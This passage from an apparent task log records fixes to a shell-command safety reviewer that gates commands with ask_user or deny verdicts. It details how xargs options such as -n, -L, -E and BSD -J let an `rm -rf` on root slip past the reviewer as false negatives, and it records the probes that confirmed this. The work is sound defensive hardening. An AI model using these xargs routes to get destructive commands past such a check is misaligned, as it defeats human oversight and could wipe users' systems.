tests). | A826 | done | Core E2E | Split default xargs appended stdin arguments into separate command variants for `-n` / `--max-args` batches so later `sh -c` invocations cannot hide dangerous positional parameters. | Runtime probe `xargs-max-args-runtime-probe-a826-20260719.log` confirmed default xargs invokes once with `$1=safe,$2=/`, while `-n1` invokes again with `$1=/`; corrected runtime probe `xargs-max-args-runtime-probe-a826-fixed-shape-20260719.log` confirmed `-n2` on `safe other /` invokes a second command with `$1=/`. Current dist probe `xargs-max-args-dist-probe-a826-20260719.log` returned `ask_user` for `-n1` and `--max-args` cases where real xargs later executes `rm -rf "$1"` with root, proving false negatives caused by modeling all stdin items as one argv. New `xargs-max-args.utils.ts` parses `-n`, `-nN`, clustered `-rnN`, `--max-args`, and `--max-args=N` before the xargs command, and `xargsCommandTokenVariants` now emits one variant per max-args batch for append mode. `auto-reviewer-remote-shell-xargs-max-args.test.ts` covers the default single-invocation ask_user baseline plus `-n1`, `--max-args=2`, and `-rn2` deny cases. | A827 | done | Core E2E | Split default xargs appended stdin arguments by `-L` / `-l` / `--max-lines` input-line batches so later `sh -c` invocations cannot hide dangerous positional parameters. | Runtime probe `xargs-max-lines-runtime-probe-a827-20260719.log` confirmed `printf 'safe other\n/\n' | xargs -L1 sh -c ...` invokes once with `$1=safe,$2=other` and again with `$1=/`, while `-L2` keeps the two input lines in one invocation. | A830 | done | Core E2E | Honor the last active xargs EOF marker option, so later `-E` / GNU EOF aliases override earlier ones before replacement command-string expansion. | Runtime probe `xargs-multiple-eof-runtime-probe-a830-20260719.log` confirmed local BSD xargs uses the last `-E` marker: `-E STOP -E DONE` processes input before `DONE`, while `-E DONE -E STOP` stops at `STOP`. Dist/source-before-fix probe `xargs-multiple-eof-dist-probe-a830-20260719.log` showed the analyzer used the first marker instead, causing paired false negative/false positive verdicts. `xargs-eof-option.utils.ts` now scans all xargs options until `--` or the utility operand and lets each EOF option update the active marker. | A831 | done | Core E2E | Model BSD `xargs -J` as argv placement rather than GNU-style line replacement: stdin args append when the marker is absent, and parsed stdin args are inserted at the marker position when present. | Runtime probes `xargs-bsd-J-no-marker-runtime-probe-a831-20260719.log` and `xargs-bsd-J-no-marker-runtime-multi-a831-20260719.log` confirmed local BSD xargs passes `$1=/` for `xargs -JROOT sh -c ... sh` with no marker in utility argv, and places parsed args as `$1=safe,$2=other,$3=/` when `ROOT` appears. Dist/source-before-fix probe `xargs-bsd-J-placement-dist-probe-a831-20260719.log` showed the analyzer missed the no-marker root positional and falsely denied `$1` while missing `$3` for multi-arg placement. New `xargs-replacement-marker.utils.ts` separates `-I`/`-i`/`--replace` line replacement from BSD `-J` placement; `xargs-command.utils.ts` now parses default stdin argv for `-J`, and `xargs-replacement-token.utils.ts` inserts those args at the marker or appends them if absent.
